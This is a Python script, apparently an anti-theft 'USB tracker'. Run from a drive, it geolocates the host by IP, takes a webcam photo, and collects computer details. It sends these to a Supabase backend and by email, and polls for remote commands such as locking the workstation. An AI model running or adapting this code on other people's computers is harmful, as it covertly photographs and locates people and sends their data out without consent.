import requests
import socket
import platform
import cv2
import base64
import time
import smtplib
import os
import re
import uuid
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

SUPABASE_URL = "https://your-project.supabase.co"
SUPABASE_KEY = "your-anon-key"

EMAIL_ENABLED = True
EMAIL_SENDER = "your-email@gmail.com"
EMAIL_PASSWORD = "your-app-password"
EMAIL_RECEIVER = "receiver-email@gmail.com"

def get_usb_serial():
    try:
        drive = os.path.splitdrive(__file__)[0]
        result = os.popen(f'vol {drive}').read()
        serial = re.search(r'Serial Number: (\S+)', result)
        if serial:
            return serial.group(1).replace('-', '')
    except:
        pass
    return str(uuid.getnode())[-8:]

USB_SERIAL = get_usb_serial()
USB_DEVICE_ID = f"USB-{USB_SERIAL[-8:]}"

print("=" * 50)
print("USB TRACKER")
print("=" * 50)
print(f"Device ID: {USB_DEVICE_ID}")
print(f"Serial: {USB_SERIAL}")
print("=" * 50)

def send_email_alert(location, system_info, photo_bytes=None):
    if not EMAIL_ENABLED:
        return
    
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = f"USB TRACKER ALERT - {USB_DEVICE_ID}"
        
        body = f"""
USB Tracker Alert!

Device ID: {USB_DEVICE_ID}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

LOCATION:
• City: {location.get('city', 'Unknown')}
• Country: {location.get('country', 'Unknown')}
• IP Address: {location.get('ip', 'Unknown')}

SYSTEM INFO:
• Computer Name: {system_info.get('computer_name', 'Unknown')}
• Operating System: {system_info.get('os_info', 'Unknown')}

This is an automated alert from your USB Tracker system.
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        if photo_bytes:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(photo_bytes)
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename=photo.jpg')
            msg.attach(attachment)
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        print("Email alert sent!")
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

def capture_photo():
    try:
        print("Opening camera...")
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        time.sleep(1)
        ret, frame = camera.read()
        camera.release()
        
        if ret and frame is not None:
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            img_bytes = buffer.tobytes()
            img_base64 = base64.b64encode(img_bytes).decode('utf-8')
            print("Photo captured!")
            return f"data:image/jpeg;base64,{img_base64}", img_bytes
    except Exception as e:
        print(f"Camera error: {e}")
    return "", None

def get_ip_location():
    try:
        ip_response = requests.get('https://api.ipify.org?format=json', timeout=10)
        ip_address = ip_response.json()['ip']
        
        loc_response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=10)
        loc = loc_response.json()
        
        if loc.get('status') == 'success':
            return {
                'lat': loc.get('lat', 0),
                'lon': loc.get('lon', 0),
                'city': loc.get('city', 'Unknown'),
                'country': loc.get('country', 'Unknown'),
                'ip': ip_address
            }
    except Exception as e:
        print(f"IP location error: {e}")
    
    return None

def get_system_info():
    try:
        computer_name = socket.gethostname()
        os_info = platform.system() + " " + platform.release()
        
        battery = "Unknown"
        try:
            import psutil
            battery_info = psutil.sensors_battery()
            if battery_info:
                battery = str(int(battery_info.percent)) + "%"
        except:
            pass
        
        return {
            'computer_name': computer_name,
            'os_info': os_info,
            'battery': battery
        }
    except:
        return {
            'computer_name': 'Unknown',
            'os_info': 'Unknown',
            'battery': 'Unknown'
        }

def check_remote_commands():
    try:
        headers = {
            'apikey': SUPABASE_KEY,
            'Authorization': f'Bearer {SUPABASE_KEY}'
        }
        
        response = requests.get(
            f'{SUPABASE_URL}/rest/v1/commands?device_id=eq.{USB_DEVICE_ID}&status=eq.pending',
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            commands = response.json()
            for cmd in commands:
                execute_command(cmd['id'], cmd['command'])
    except Exception as e:
        print(f"Command check error: {e}")

def execute_command(cmd_id, command):
    try:
        if command == "LOCK":
            print("LOCK command received!")
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.LockWorkStation()
        
        headers = {
            'apikey': SUPABASE_KEY,
            'Authorization': f'Bearer {SUPABASE_KEY}',
            'Content-Type': 'application/json'
        }
        
        requests.patch(
            f'{SUPABASE_URL}/rest/v1/commands?id=eq.{cmd_id}',
            headers=headers,
            json={'status': 'completed'},
            timeout=10
        )
    except Exception as e:
        print(f"Execute error: {e}")

def send_to_supabase(data):
    headers = {
        'apikey': SUPABASE_KEY,
        'Authorization': f'Bearer {SUPABASE_KEY}',
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.post(
            f'{SUPABASE_URL}/rest/v1/locations',
            headers=headers,
            json=data,
            timeout=10
        )
        return response.status_code == 201
    except Exception as e:
        print(f"Supabase error: {e}")
        return False

print("=" * 50)
print("USB TRACKER STARTED")
print("=" * 50)

location = get_ip_location()
if location:
    print(f"Location: {location['city']}, {location['country']}")
    print(f"IP: {location['ip']}")
else:
    location = {'lat': 0, 'lon': 0, 'city': 'Unknown', 'country': 'Unknown', 'ip': 'Unknown'}

print("\nCapturing photo...")
photo_base64, photo_bytes = capture_photo()

system_info = get_system_info()
print(f"\nComputer: {system_info['computer_name']}")
print(f"OS: {system_info['os_info']}")

print("\nSending to Supabase...")
data = {
    'device_id': USB_DEVICE_ID,
    'latitude': location['lat'],
    'longitude': location['lon'],
    'city': location['city'],
    'country': location['country'],
    'ip_address': location['ip'],
    'computer_name': system_info['computer_name'],
    'os_info': system_info['os_info'],
    'battery': system_info['battery'],
    'camera_image': photo_base64
}

if send_to_supabase(data):
    print("Data saved to Supabase!")
    if EMAIL_ENABLED:
        print("\nSending email alert...")
        send_email_alert(location, system_info, photo_bytes)
    if photo_base64:
        print("Photo saved with location!")
else:
    print("Failed to save data")

print("\nChecking for remote commands...")
check_remote_commands()

print("\n" + "=" * 50)
print("TRACKER FINISHED")
print("=" * 50)